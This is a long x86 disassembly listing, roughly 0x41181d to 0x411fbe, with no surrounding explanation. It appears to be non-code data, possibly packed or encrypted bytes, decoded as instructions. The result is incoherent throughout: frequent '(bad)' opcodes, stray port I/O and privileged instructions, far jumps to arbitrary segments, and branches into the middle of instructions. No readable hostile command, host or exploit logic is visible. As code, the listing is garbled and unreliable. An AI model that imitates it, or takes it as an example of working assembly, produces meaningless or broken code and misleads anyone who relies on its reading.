  41181d:	lods   eax,DWORD PTR ds:[esi]
  41181e:	int    0xa3
  411820:	xor    al,0x5
  411822:	mov    esi,0x1e9736ca
  411827:	out    0xdf,al
  411829:	xchg   ecx,eax
  41182a:	pop    esi
  41182b:	in     al,dx
  41182c:	push   esi
  41182e:	or     al,bh
  411830:	pop    ebx
  411831:	and    al,BYTE PTR [eax-0x37]
  411834:	sub    BYTE PTR [ebp+0x4e89d95a],0xc0
  41183b:	push   ecx
  41183c:	dec    ecx
  41183d:	mov    ch,BYTE PTR [ecx+0x2de7abf3]
  411843:	rol    BYTE PTR [ecx],1
  411845:	fnstcw WORD PTR [edx]
  411847:	inc    ebp
  411848:	(bad)  
  411849:	std    
  41184a:	dec    ebp
  41184b:	cmp    eax,DWORD PTR [ebx]
  41184d:	fistp  DWORD PTR [ebp+0x145d2e01]
  411853:	test   cl,al
  411855:	fcomp  QWORD PTR [ebx]
  411857:	shr    ah,cl
  411859:	inc    eax
  41185a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41185b:	and    dh,dl
  41185d:	sbb    BYTE PTR [eax],bl
  41185f:	stc    
  411860:	sar    bh,0x11
  411863:	mov    ah,0xb0
  411865:	imul   edi,DWORD PTR [edx-0x4e],0x8adf813d
  41186c:	es jmp 0xc54f:0xc19c2fc9
  411874:	es xchg esp,eax
  411876:	inc    esi
  411877:	popf   
  411878:	dec    DWORD PTR [esi+ebp*1+0xc]
  41187c:	imul   edx,DWORD PTR [esi-0x66],0xfffffff5
  411880:	imul   esp,DWORD PTR [esp+esi*4],0x4c74cc0a
  411887:	jmp    0x80cd:0x412247f1
  41188e:	sahf   
  41188f:	dec    ebx
  411890:	sbb    eax,0xaba828b0
  411895:	(bad)
  411899:	(bad)  
  41189a:	cmp    DWORD PTR [edx+eax*4+0x67],esp
  41189e:	and    BYTE PTR [ebx+0x7e238cba],0x2e
  4118a5:	aam    0x5
  4118a7:	pop    esp
  4118a8:	ss mov bl,0xaa
  4118ab:	xor    eax,0xad9ae532
  4118b0:	add    al,bh
  4118b2:	mov    ecx,cs
  4118b4:	aaa    
  4118b5:	ret    
  4118b6:	jb     0x411901
  4118b8:	data16 int 0x10
  4118bb:	push   ss
  4118bc:	sahf   
  4118bd:	stos   BYTE PTR es:[edi],al
  4118be:	test   eax,0xbc9ef0cd
  4118c3:	mov    ebp,0xa7fc2ed1
  4118c8:	sub    cl,BYTE PTR [edi-0x33ea2eb5]
  4118ce:	mov    cs,WORD PTR [edi+0x7b]
  4118d1:	lods   al,BYTE PTR ds:[esi]
  4118d2:	adc    DWORD PTR [esi+0x39d158bf],ebx
  4118d8:	sahf   
  4118d9:	and    ebx,esi
  4118db:	ja     0x411877
  4118dd:	sub    al,0x23
  4118df:	sar    ebx,0xea
  4118e2:	jge    0x4118c5
  4118e4:	adc    al,0x6b
  4118e6:	add    al,0xd4
  4118e8:	je     0x411949
  4118ea:	or     ah,BYTE PTR [edi]
  4118ec:	in     al,dx
  4118ed:	cmp    BYTE PTR [ebp-0x5a677754],cl
  4118f3:	jle    0x411960
  4118f5:	inc    eax
  4118f6:	mov    es,edx
  4118f8:	inc    edi
  4118f9:	test   eax,0x1f9f735d
  4118fe:	inc    eax
  4118ff:	lea    ebx,[edi+0x14]
  411902:	xlat   BYTE PTR ds:[ebx]
  411903:	xchg   ecx,eax
  411904:	jno    0x4118e2
  411906:	inc    bl
  411908:	sti    
  411909:	pop    ebp
  41190a:	jmp    FWORD PTR [ebp-0x7e]
  41190d:	dec    esp
  41190e:	dec    ebx
  41190f:	mov    eax,ds:0xec6e0cf9
  411914:	(bad)  
  411915:	lock jno 0x411951
  411918:	jno    0x41192e
  41191a:	mov    esi,0xf816ef76
  41191f:	daa    
  411920:	cmp    DWORD PTR [esi+0x10],esp
  411923:	jmp    0x41193e
  411925:	loop   0x411903
  411927:	popa   
  411928:	dec    esp
  411929:	adc    eax,0xd765e1c0
  41192e:	jae    0x4119ab
  411930:	cmp    al,0x28
  411932:	(bad)  
  411933:	mov    al,ds:0xacab418e
  411938:	sar    BYTE PTR [edx+0x66],cl
  41193b:	sub    eax,0x6e95e01c
  411940:	out    dx,eax
  411941:	loop   0x411951
  411943:	fild   DWORD PTR [edx]
  411945:	(bad)  
  411946:	mov    ebp,0x7bc078e0
  41194b:	test   al,0x5d
  41194d:	push   ecx
  41194e:	or     BYTE PTR [ecx+eax*8-0xb],0x68
  411953:	push   eax
  411954:	mov    ch,0x29
  411956:	fst    DWORD PTR [esi-0x40484c9f]
  41195c:	imul   BYTE PTR [esp+esi*2-0x25]
  411960:	inc    ebx
  411961:	xlat   BYTE PTR ds:[ebx]
  411962:	cmp    BYTE PTR [edi],al
  411964:	cld    
  411965:	xchg   edx,eax
  411966:	gs (bad) 
  411968:	lahf   
  411969:	cdq    
  41196a:	push   ecx
  41196b:	xchg   edi,eax
  41196c:	shl    BYTE PTR [eax],0x59
  41196f:	mov    bl,0x0
  411971:	rcl    BYTE PTR [ebx],1
  411973:	sahf   
  411974:	push   eax
  411975:	pop    ebp
  411976:	retf   
  411977:	inc    edx
  411978:	sti    
  411979:	adc    ecx,DWORD PTR [edx+0x75]
  41197c:	sbb    dl,BYTE PTR [eax-0x9d775e3]
  411982:	cs push ss
  411984:	or     BYTE PTR [eax-0xf093423],bh
  41198a:	test   BYTE PTR [ecx],cl
  41198c:	mov    esp,0x621eaa90
  411991:	sub    DWORD PTR [ebp+ebp*1-0x4552dd2d],eax
  411998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411999:	or     bl,BYTE PTR [ecx]
  41199b:	jmp    0x11f4:0x98186357
  4119a2:	pop    ecx
  4119a3:	fcomi  st,st(7)
  4119a5:	add    al,0x99
  4119a7:	cs mov edx,0xaa5d869f
  4119ad:	push   edi
  4119ae:	sbb    bl,bh
  4119b0:	sbb    BYTE PTR [eax],0x49
  4119b3:	mov    ?,WORD PTR [ebp+0x7f18febe]
  4119b9:	ins    DWORD PTR es:[edi],dx
  4119ba:	inc    edx
  4119bb:	ror    BYTE PTR [ebp-0x2fc1d3d0],cl
  4119c1:	jl     0x4119df
  4119c3:	call   0x39fa:0x1f4cbd4f
  4119ca:	dec    ecx
  4119cb:	imul   esi,DWORD PTR [ebx+0x3b],0xd6815af1
  4119d2:	mov    esp,0x699aeae8
  4119d7:	mov    WORD PTR [ebx],ax
  4119da:	inc    esi
  4119db:	(bad)  
  4119dc:	int    0xe8
  4119de:	mov    eax,ds:0x62cb039f
  4119e3:	inc    esi
  4119e4:	mov    al,0x5c
  4119e6:	xchg   esp,eax
  4119e7:	mov    eax,es
  4119e9:	lods   al,BYTE PTR ds:[esi]
  4119ea:	pop    ds
  4119eb:	es pop ss
  4119ed:	lock (bad) 
  4119ef:	shr    BYTE PTR [edi],cl
  4119f1:	xor    bl,ah
  4119f3:	push   cs
  4119f4:	push   es
  4119f5:	or     BYTE PTR [ecx+0x1e],ch
  4119f8:	shl    BYTE PTR [eax+0x14e94d62],1
  4119fe:	sbb    eax,0xdae536e0
  411a03:	scas   eax,DWORD PTR es:[edi]
  411a04:	inc    ebp
  411a05:	cs iret 
  411a07:	mov    bl,0xf0
  411a09:	repz lock popf 
  411a0c:	faddp  st(3),st
  411a0e:	sahf   
  411a0f:	fcomp  DWORD PTR [ebx-0x6a]
  411a12:	fnstenv [ebx+ebx*2-0x4b]
  411a16:	ins    DWORD PTR es:[edi],dx
  411a17:	mov    bh,0x33
  411a19:	adc    eax,0xf90c9994
  411a1e:	fwait
  411a1f:	rcr    BYTE PTR [ebx+0x55],cl
  411a22:	jnp    0x411a9e
  411a24:	and    BYTE PTR [ebp-0x72ae9f44],bh
  411a2a:	inc    esp
  411a2b:	fs pusha 
  411a2d:	ficom  WORD PTR [esi+0x29]
  411a30:	aad    0xf1
  411a32:	out    0x2d,al
  411a34:	test   al,0x8c
  411a36:	mov    dh,0xd
  411a38:	cli    
  411a39:	sahf   
  411a3a:	mov    esi,DWORD PTR [edx+0x6d092fd7]
  411a40:	in     al,dx
  411a41:	add    eax,0xacbae072
  411a46:	test   BYTE PTR [ecx+0x12],0x8a
  411a4a:	inc    edx
  411a4b:	jmp    0x411a25
  411a4d:	cmp    eax,0x6018e52e
  411a52:	daa    
  411a53:	jmp    0x411a6c
  411a55:	inc    ecx
  411a56:	sub    ebx,DWORD PTR [edi-0x4a]
  411a59:	pusha  
  411a5a:	dec    ecx
  411a5b:	ins    DWORD PTR es:[edi],dx
  411a5c:	sub    ebx,esp
  411a5e:	mov    ebx,0x3d879a4a
  411a63:	shl    DWORD PTR [ebx+edi*1+0x763190b0],0x6c
  411a6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a6c:	outs   dx,DWORD PTR ds:[esi]
  411a6d:	adc    eax,0x231d5c13
  411a72:	cwde   
  411a73:	sub    eax,0xfeb38ff2
  411a78:	pop    ds
  411a79:	cld    
  411a7a:	inc    edi
  411a7b:	in     eax,0xb5
  411a7d:	push   edx
  411a7e:	cmovle edx,DWORD PTR [ebp-0x193a2593]
  411a85:	(bad)  
  411a86:	mov    cl,0xad
  411a88:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a8a:	xchg   edx,eax
  411a8b:	mov    ah,0xf
  411a8d:	adc    eax,0xf6faa2f2
  411a92:	adc    al,0xab
  411a94:	mov    DWORD PTR [ebx+0x16a101b2],ebx
  411a9a:	out    dx,eax
  411a9b:	ret    0x859
  411a9e:	in     al,0xb5
  411aa0:	mov    dh,0x9b
  411aa2:	pushf  
  411aa3:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  411aa5:	push   ebp
  411aa6:	stc    
  411aa7:	push   ebp
  411aa8:	mov    edi,0x6c2605fa
  411aad:	cmp    BYTE PTR [eax+0x186d5f34],bl
  411ab3:	sub    eax,0xf91b7754
  411ab8:	inc    esp
  411ab9:	sbb    edx,0x77f339e7
  411abf:	aas    
  411ac0:	fidivr WORD PTR [eax+0x68092e76]
  411ac6:	adc    al,BYTE PTR [ebp+0x10]
  411ac9:	pop    edx
  411aca:	dec    edi
  411acb:	(bad)  [ebx-0x2d8701c9]
  411ad1:	setae  BYTE PTR [edi-0x7efdaa4d]
  411ad8:	sub    dh,BYTE PTR [eax+0x54]
  411adb:	dec    ecx
  411adc:	je     0x411a77
  411ade:	and    ch,BYTE PTR [ebx+edx*2]
  411ae1:	add    BYTE PTR [edi+0x56c14d9a],ch
  411ae7:	or     al,0x45
  411ae9:	aam    0xa5
  411aeb:	pop    ds
  411aec:	and    eax,0x5321f6de
  411af1:	out    0x2a,al
  411af3:	sub    DWORD PTR [eax+esi*1+0x47],eax
  411af7:	pop    ds
  411af8:	cmp    eax,0xbc48b850
  411afd:	adc    esi,DWORD PTR [edi-0x59f616f]
  411b03:	xchg   ebx,eax
  411b04:	fcomi  st,st(4)
  411b07:	sti    
  411b08:	xor    al,0xea
  411b0a:	in     eax,dx
  411b0b:	mov    ds:0xcc70d24f,eax
  411b10:	div    DWORD PTR [edi-0x3ec31823]
  411b16:	imul   edi,DWORD PTR [ebx+eiz*4-0x291a28f7],0xffffff9a
  411b1e:	fld    TBYTE PTR [eax-0x5f]
  411b21:	scas   al,BYTE PTR es:[edi]
  411b22:	xchg   esp,eax
  411b23:	scas   al,BYTE PTR es:[edi]
  411b24:	dec    edx
  411b25:	adc    DWORD PTR [ebx],esp
  411b27:	xor    esp,DWORD PTR [esp+ecx*4-0x30]
  411b2b:	out    0x2a,eax
  411b2d:	or     al,0x88
  411b2f:	or     al,0xcf
  411b31:	push   ds
  411b32:	mov    cl,0x9c
  411b34:	cmc    
  411b35:	inc    edx
  411b36:	pop    edx
  411b37:	js     0x411b59
  411b39:	shl    bl,cl
  411b3b:	xor    al,0x48
  411b3d:	sbb    BYTE PTR [esi],ch
  411b3f:	out    dx,al
  411b40:	pushw  es
  411b42:	mov    al,0x38
  411b44:	aad    0xe0
  411b46:	xor    esi,edx
  411b48:	cwde   
  411b49:	jecxz  0x411b86
  411b4b:	(bad)  
  411b4c:	scas   al,BYTE PTR es:[edi]
  411b4d:	and    ah,dh
  411b4f:	xchg   ebx,eax
  411b50:	or     edx,DWORD PTR [eax+0x8]
  411b53:	fldcw  WORD PTR [edi-0x56]
  411b56:	pop    eax
  411b57:	mov    al,0x81
  411b59:	in     al,0xca
  411b5b:	pop    ebx
  411b5c:	lahf   
  411b5d:	mov    esp,edi
  411b5f:	or     BYTE PTR [edx],cl
  411b61:	xchg   esp,eax
  411b62:	adc    DWORD PTR [esi+0x92bd241],esi
  411b68:	and    BYTE PTR [ecx],dl
  411b6a:	add    BYTE PTR [edx-0x29],ah
  411b6d:	dec    edx
  411b6e:	popaw  
  411b70:	adc    edx,esi
  411b72:	add    BYTE PTR [ebx+0x78],dl
  411b75:	or     eax,0x1afc930f
  411b7a:	mov    edx,0x6a5ff2d9
  411b7f:	cmc    
  411b80:	inc    edx
  411b81:	xchg   esp,eax
  411b82:	inc    esp
  411b83:	out    0xd4,al
  411b85:	mov    cs,WORD PTR [ebx]
  411b87:	sub    eax,0xaed35e20
  411b8c:	push   cs
  411b8d:	mov    esi,0xdd321769
  411b92:	adc    al,dl
  411b94:	cmp    DWORD PTR [ebx],ebx
  411b96:	(bad)  
  411b97:	push   ebp
  411b98:	outs   dx,BYTE PTR ds:[esi]
  411b99:	xchg   ebp,eax
  411b9a:	cmp    esi,ebp
  411b9c:	push   ecx
  411b9d:	call   0x891e:0x9d15948f
  411ba4:	nop
  411ba5:	inc    BYTE PTR [eax-0x42]
  411ba8:	sbb    al,0x8e
  411baa:	jno    0x411b48
  411bac:	jne    0x411b37
  411bae:	sbb    al,0xc6
  411bb0:	mov    DWORD PTR [eax+0x76],0x2bdf6abc
  411bb7:	scas   eax,DWORD PTR es:[edi]
  411bb8:	test   BYTE PTR [esi+0x4bbe0638],bl
  411bbe:	cmp    al,0x36
  411bc0:	mov    ds:0x474f70a9,al
  411bc5:	or     eax,0x7f2a4626
  411bca:	or     DWORD PTR [eax-0x65],ebp
  411bcd:	loopne 0x411be5
  411bcf:	push   edx
  411bd0:	adc    ch,bl
  411bd2:	xchg   BYTE PTR [esi+0x18dcbba4],al
  411bd8:	adc    eax,0x514301f
  411bdd:	and    ecx,DWORD PTR [ebp-0x62cced24]
  411be3:	or     eax,0xabf18337
  411be8:	mov    al,BYTE PTR [edx-0x7c]
  411beb:	mov    edx,0x5350ae38
  411bf0:	cmp    ah,dh
  411bf2:	daa    
  411bf3:	jo     0x411c5a
  411bf5:	ja     0x411c37
  411bf7:	fimul  WORD PTR [esi]
  411bf9:	out    0x55,eax
  411bfb:	mov    ebx,0x4cb40ea0
  411c00:	cmp    DWORD PTR [edx+0x588817fa],esi
  411c06:	mov    al,BYTE PTR [eax-0x5]
  411c09:	inc    edx
  411c0a:	jg     0x411b92
  411c0c:	dec    ecx
  411c0d:	pop    ecx
  411c0e:	lahf   
  411c0f:	mov    gs,WORD PTR [ebx]
  411c11:	retf   0xff72
  411c14:	cmp    cl,BYTE PTR [ebp-0x34663962]
  411c1a:	jne    0x411bd3
  411c1c:	inc    eax
  411c1d:	fnstsw WORD PTR [ebx+0x65624cf6]
  411c23:	jl     0x411c1b
  411c25:	xor    DWORD PTR [esi+0x2f9bda7f],esp
  411c2b:	push   ecx
  411c2c:	inc    ebx
  411c2d:	enter  0xf26,0xe0
  411c31:	dec    eax
  411c32:	fsubp  st(3),st
  411c34:	mov    bh,0x35
  411c36:	jbe    0x411bc1
  411c38:	sbb    ch,BYTE PTR ds:0xe72f2ad9
  411c3e:	adc    dh,dl
  411c40:	fisub  DWORD PTR ds:0x43090029
  411c46:	sbb    BYTE PTR [ecx],bh
  411c48:	push   ds
  411c49:	mov    WORD PTR [esi-0x18],ss
  411c4c:	out    0x65,eax
  411c4e:	sti    
  411c4f:	je     0x411c3f
  411c51:	int3   
  411c52:	mov    BYTE PTR [ecx],dl
  411c54:	lock cmp al,0xf5
  411c57:	or     BYTE PTR [ecx-0x43],0xb5
  411c5b:	push   esi
  411c5c:	ins    DWORD PTR es:[edi],dx
  411c5d:	push   ss
  411c5e:	cmp    cl,dh
  411c60:	js     0x411ca7
  411c62:	aaa    
  411c63:	or     eax,0x30766bc2
  411c68:	sub    eax,0x3e36eaa
  411c6d:	clc    
  411c6e:	xchg   ebp,eax
  411c6f:	lods   al,BYTE PTR ds:[esi]
  411c70:	xchg   ebx,eax
  411c71:	call   0xdd6e838c
  411c76:	pop    esi
  411c77:	test   edi,esp
  411c79:	sbb    esi,DWORD PTR fs:[esi+0x553dea4f]
  411c80:	sub    ah,bl
  411c82:	neg    esp
  411c84:	loopne 0x411c44
  411c86:	xchg   BYTE PTR [ecx+0x51],ah
  411c89:	mov    dh,0x44
  411c8b:	pop    ds
  411c8c:	daa    
  411c8d:	daa    
  411c8e:	(bad)  
  411c8f:	retf   
  411c90:	aad    0xe
  411c92:	popa   
  411c93:	std    
  411c94:	loope  0x411c29
  411c96:	fcmovnb st,st(3)
  411c98:	jg     0x411ca5
  411c9a:	xor    DWORD PTR [eax+0x2],ebx
  411c9d:	outs   dx,DWORD PTR ds:[esi]
  411c9e:	std    
  411c9f:	adc    esi,edx
  411ca1:	iret   
  411ca2:	mov    esi,0x8e669ae
  411ca7:	mov    dl,0xb1
  411ca9:	clc    
  411caa:	clc    
  411cab:	sbb    eax,0x330b97ea
  411cb0:	pop    ds
  411cb1:	push   ebp
  411cb2:	pop    ds
  411cb3:	js     0x411c6b
  411cb5:	aaa    
  411cb6:	ret    0x7fcd
  411cb9:	sahf   
  411cba:	add    dh,BYTE PTR [ecx+0x1f]
  411cbd:	xchg   edi,eax
  411cbe:	push   cs
  411cbf:	sahf   
  411cc0:	dec    ebp
  411cc1:	push   edx
  411cc2:	rol    DWORD PTR [ebp+ecx*1+0x4051c56b],0xd2
  411cca:	les    eax,FWORD PTR [esi]
  411ccc:	mov    WORD PTR [ebx+0x44],?
  411ccf:	adc    eax,0x9c7271c9
  411cd4:	repz cmp esi,DWORD PTR ss:[ebp+0x2e]
  411cd9:	cmp    al,0x93
  411cdb:	mov    ebp,0x2d36e75c
  411ce0:	bnd jbe 0x411cf5
  411ce3:	(bad)  
  411ce4:	cld    
  411ce5:	pop    esp
  411ce6:	add    cl,BYTE PTR ds:0x21aa0ba5
  411cec:	int    0x0
  411cee:	aad    0x14
  411cf0:	(bad)  
  411cf1:	or     al,0x65
  411cf3:	bound  ebx,QWORD PTR [ebp+0x192b9949]
  411cf9:	jns    0x411cb2
  411cfb:	sbb    BYTE PTR [ebx-0x2bcdaee],bl
  411d01:	mov    BYTE PTR [edx+0x1572680a],al
  411d07:	sbb    al,0xe9
  411d09:	push   ds
  411d0a:	nop
  411d0b:	test   al,0xdd
  411d0d:	test   DWORD PTR [ebx+0x43fd5e53],esp
  411d13:	stos   DWORD PTR es:[di],eax
  411d15:	in     al,dx
  411d16:	rcr    DWORD PTR [ebp-0x1f],cl
  411d19:	pop    es
  411d1a:	push   edx
  411d1b:	popa   
  411d1c:	mov    WORD PTR [esp+esi*4-0x9],gs
  411d20:	or     esp,DWORD PTR [ebx]
  411d22:	jo     0x411cb2
  411d24:	enter  0x7f5c,0x7d
  411d28:	jne    0x411cbc
  411d2a:	sub    al,0x58
  411d2c:	or     al,0xa
  411d2e:	dec    ebp
  411d2f:	push   eax
  411d30:	retf   
  411d31:	shr    eax,cl
  411d33:	ds mov edx,0x9fc89b83
  411d39:	sar    DWORD PTR [edx-0x625708a],cl
  411d3f:	lds    ebp,FWORD PTR [edx]
  411d41:	pop    eax
  411d42:	int    0xd9
  411d44:	adc    edx,DWORD PTR [ebx-0x14]
  411d47:	rcr    BYTE PTR [eax+0x3ae61bcc],1
  411d4d:	push   esi
  411d4e:	jns    0x411d32
  411d50:	jbe    0x411d64
  411d52:	jno    0x411dcc
  411d54:	call   0xeb107e0b
  411d59:	in     eax,dx
  411d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d5b:	sbb    esi,edx
  411d5d:	dec    esp
  411d5e:	dec    eax
  411d5f:	adc    dh,BYTE PTR [edx]
  411d61:	xor    al,0x16
  411d63:	adc    edi,edx
  411d65:	sub    bh,ch
  411d67:	xor    al,0x67
  411d69:	pop    edi
  411d6a:	and    al,0xd8
  411d6c:	mov    edi,0x57ff8626
  411d71:	push   cs
  411d72:	scas   al,BYTE PTR es:[edi]
  411d73:	cmp    ah,cl
  411d75:	mov    ah,0x28
  411d77:	shl    DWORD PTR [eax-0x72],1
  411d7a:	mov    ebx,0xb57d4f2a
  411d7f:	cmp    edx,edx
  411d81:	mov    es,WORD PTR [ebx+0x7cfeec1e]
  411d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d88:	pop    edx
  411d89:	mov    al,ds:0xccc1829d
  411d8e:	adc    cl,BYTE PTR [ebp-0x73]
  411d91:	iret   
  411d92:	imul   esp,DWORD PTR ds:[ecx],0x4
  411d96:	ins    DWORD PTR es:[edi],dx
  411d97:	and    eax,DWORD PTR [esi]
  411d99:	cmp    ecx,edi
  411d9b:	sar    eax,1
  411d9d:	(bad)  
  411d9e:	or     DWORD PTR [ebx],ebp
  411da0:	leave  
  411da1:	and    BYTE PTR [edi-0x19],cl
  411da4:	dec    esi
  411da5:	jnp    0x411d3f
  411da7:	imul   esp,DWORD PTR [edx+0x27],0xf086cd37
  411dae:	daa    
  411daf:	(bad)  
  411db0:	push   esp
  411db1:	int    0x26
  411db3:	stc    
  411db4:	push   edx
  411db5:	mov    eax,0x3a6e21c8
  411dba:	sbb    DWORD PTR [ebx+0x29],edx
  411dbd:	jle    0x411df2
  411dbf:	pop    ebp
  411dc0:	adc    dh,cl
  411dc2:	fs push edx
  411dc4:	push   ss
  411dc5:	in     al,0x63
  411dc7:	cmp    BYTE PTR [ebx+0x48],dh
  411dca:	fisttp WORD PTR [ebx-0x36]
  411dcd:	jae    0x411dd4
  411dcf:	ror    dl,0x35
  411dd2:	(bad)  
  411dd3:	outs   dx,BYTE PTR ds:[esi]
  411dd4:	jecxz  0x411dd3
  411dd6:	mov    al,ds:0x25d21d79
  411ddb:	mov    WORD PTR [esi-0x79],?
  411dde:	xor    DWORD PTR [edi+0x38],ebp
  411de1:	sub    eax,0x8f7701d2
  411de6:	data16 jbe 0x411d8d
  411de9:	gs fwait
  411deb:	pushf  
  411dec:	test   DWORD PTR [ebx+0x5c34c204],esi
  411df2:	sbb    al,0x6c
  411df4:	bound  ecx,QWORD PTR [esi-0x2bdb658e]
  411dfa:	sbb    eax,0x2f1c0250
  411dff:	call   0xf152:0x6f69d4bc
  411e06:	retf   
  411e07:	pushf  
  411e08:	fdivr  DWORD PTR [ebx+ecx*8]
  411e0b:	or     edx,DWORD PTR [ebx]
  411e0d:	add    al,BYTE PTR [esi]
  411e0f:	adc    al,0xfa
  411e11:	jge    0x411dee
  411e13:	call   0xa7c2:0xb9207188
  411e1a:	fsubr  DWORD PTR [edx]
  411e1c:	aaa    
  411e1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e1e:	dec    eax
  411e1f:	xor    bl,BYTE PTR [eax-0x66]
  411e22:	(bad)
  411e27:	cmp    al,0x51
  411e29:	inc    ebx
  411e2a:	int3   
  411e2b:	sub    DWORD PTR [edi+0x419dce05],edi
  411e31:	fstp   TBYTE PTR [edx]
  411e33:	mov    esi,fs
  411e35:	lods   eax,DWORD PTR ds:[esi]
  411e36:	addr16 fwait
  411e38:	adc    cl,BYTE PTR [ebx-0x26]
  411e3b:	push   esi
  411e3c:	hlt    
  411e3d:	not    bh
  411e3f:	paddw  mm2,QWORD PTR [esp+eiz*2+0x4328c2de]
  411e47:	repz sbb edi,DWORD PTR [esi]
  411e4a:	fwait
  411e4b:	xchg   edx,eax
  411e4c:	test   al,0xd5
  411e4e:	sbb    eax,0xbe61b6bb
  411e53:	xor    eax,0xb775eef3
  411e58:	and    BYTE PTR [esp+edi*1],dh
  411e5b:	add    al,ah
  411e5d:	or     BYTE PTR [esi],bl
  411e5f:	(bad)  
  411e61:	lods   eax,DWORD PTR ds:[esi]
  411e62:	inc    edi
  411e63:	rcr    BYTE PTR [ecx],1
  411e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e66:	cdq    
  411e67:	daa    
  411e68:	fwait
  411e69:	retf   0xc5c0
  411e6c:	mov    eax,ds:0x53a4e5aa
  411e71:	clc    
  411e72:	push   esp
  411e73:	(bad)  
  411e74:	dec    esi
  411e75:	mov    al,ds:0xffd65c6f
  411e7a:	or     eax,DWORD PTR [ecx-0x4142267f]
  411e80:	call   0x6465d6fe
  411e85:	cmp    al,0xf0
  411e87:	push   edx
  411e88:	test   eax,0x2a566f04
  411e8d:	fistp  QWORD PTR [edx-0x13a3db57]
  411e93:	jge    0x411f13
  411e95:	jecxz  0x411e19
  411e97:	add    al,0x14
  411e99:	ret    
  411e9a:	inc    ecx
  411e9b:	dec    esp
  411e9c:	push   esi
  411e9d:	xlat   BYTE PTR ds:[ebx]
  411e9e:	sub    DWORD PTR [esi+0x30],0xffffffdf
  411ea2:	dec    ebp
  411ea3:	mov    cl,0x9a
  411ea5:	add    ebp,eax
  411ea7:	push   ebp
  411ea8:	imul   DWORD PTR [ecx+0x4f]
  411eab:	mov    edx,0xfe313d0c
  411eb0:	int3   
  411eb1:	jle    0x411f18
  411eb3:	popf   
  411eb4:	int    0x42
  411eb6:	or     ebp,edx
  411eb8:	push   esi
  411eb9:	or     eax,0x30f7b315
  411ebe:	fndisi(8087 only) 
  411ec0:	sbb    BYTE PTR [eax+0x36],bh
  411ec3:	sbb    eax,DWORD PTR [ecx-0x5212cb5b]
  411ec9:	dec    esi
  411eca:	cld    
  411ecb:	gs xchg esp,eax
  411ecd:	push   ebp
  411ece:	shr    bl,1
  411ed0:	out    dx,eax
  411ed1:	in     al,dx
  411ed2:	call   0x9441c8f1
  411ed7:	jae    0x411ec2
  411ed9:	push   0x3323a0b2
  411ede:	dec    ebp
  411edf:	jae    0x411f14
  411ee1:	call   0x629e:0x4e7890ec
  411ee8:	dec    eax
  411ee9:	mov    ds:0x421f5018,eax
  411eee:	cmp    al,0x73
  411ef0:	icebp  
  411ef1:	cmp    DWORD PTR [edx-0xd],ecx
  411ef4:	out    0xfb,eax
  411ef6:	loopne 0x411efb
  411ef8:	or     DWORD PTR [ebx+0x31],edx
  411efb:	ins    DWORD PTR es:[edi],dx
  411efc:	sbb    ebx,DWORD PTR [esp+ebx*8+0x2f387c7b]
  411f03:	fcomp  QWORD PTR [eax]
  411f05:	nop
  411f06:	dec    ebx
  411f07:	inc    edx
  411f08:	pop    eax
  411f09:	popa   
  411f0a:	push   ebx
  411f0b:	jl     0x411f6d
  411f0d:	lds    esp,FWORD PTR [esi+0x56]
  411f10:	dec    ecx
  411f11:	mov    cs,WORD PTR [edi+0x6a]
  411f14:	sbb    esp,esp
  411f16:	shl    DWORD PTR [ebp+0x490de68f],cl
  411f1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f1d:	mov    ecx,DWORD PTR [esi+0x8]
  411f20:	fst    DWORD PTR [ecx]
  411f22:	adc    eax,0xbc48e2f1
  411f27:	inc    ecx
  411f28:	hlt    
  411f29:	xlat   BYTE PTR ds:[ebx]
  411f2a:	paddusw mm0,QWORD PTR [esi]
  411f2d:	(bad)
  411f30:	leave  
  411f31:	mov    bl,0xae
  411f33:	dec    eax
  411f34:	into   
  411f35:	iret   
  411f36:	nop
  411f37:	inc    ecx
  411f38:	clc    
  411f39:	mov    BYTE PTR ds:0xbcaabfa3,dh
  411f3f:	lods   al,BYTE PTR ds:[esi]
  411f40:	(bad)  
  411f41:	retf   0xa646
  411f44:	push   ecx
  411f45:	inc    esp
  411f46:	mov    edx,0x9cd6660
  411f4b:	or     dh,BYTE PTR [edi+0x66f6842]
  411f51:	jne    0x411fc8
  411f53:	jmp    0x411fc3
  411f55:	inc    edx
  411f56:	mov    ah,0x5c
  411f58:	or     eax,DWORD PTR [edi-0x63]
  411f5b:	fcomp  st(2)
  411f5d:	dec    esi
  411f5e:	fst    QWORD PTR [eax-0x2a87297f]
  411f64:	or     ecx,0xfffffff7
  411f67:	inc    edi
  411f68:	dec    ebp
  411f69:	jae    0x411f59
  411f6b:	pop    eax
  411f6c:	out    0x56,al
  411f6e:	lods   eax,DWORD PTR ds:[esi]
  411f6f:	adc    eax,0x4566da1b
  411f74:	sbb    al,0x2e
  411f76:	std    
  411f77:	out    dx,eax
  411f78:	push   0x4d
  411f7a:	ins    BYTE PTR es:[edi],dx
  411f7b:	icebp  
  411f7c:	jmp    0x411ffc
  411f7e:	repz in eax,0x2c
  411f81:	xchg   esi,eax
  411f82:	test   al,dh
  411f84:	mov    eax,ds:0xf77022f6
  411f89:	and    BYTE PTR [ecx+0x5],0xc3
  411f8d:	iret   
  411f8e:	iret   
  411f8f:	pushf  
  411f90:	xor    bh,BYTE PTR [ebx]
  411f92:	inc    esp
  411f93:	cld    
  411f94:	pushf  
  411f95:	xor    DWORD PTR [esi-0x3e25d67f],0xffffffcd
  411f9c:	mov    si,WORD PTR [eax-0x73]
  411fa0:	aad    0x8a
  411fa2:	push   ds
  411fa3:	cdq    
  411fa4:	mov    eax,DWORD PTR [ecx-0x6]
  411fa7:	(bad)  [ebx+0x5bd5d4da]
  411fad:	ds cld 
  411faf:	inc    esi
  411fb0:	mov    edx,DWORD PTR [edi+0x74]
  411fb3:	mov    esi,0x4680948
  411fb8:	out    0x83,eax
  411fba:	xor    ebp,eax
  411fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fbd:	scas   al,BYTE PTR es:[edi]
  411fbe:	or     eax,0x6a61d521
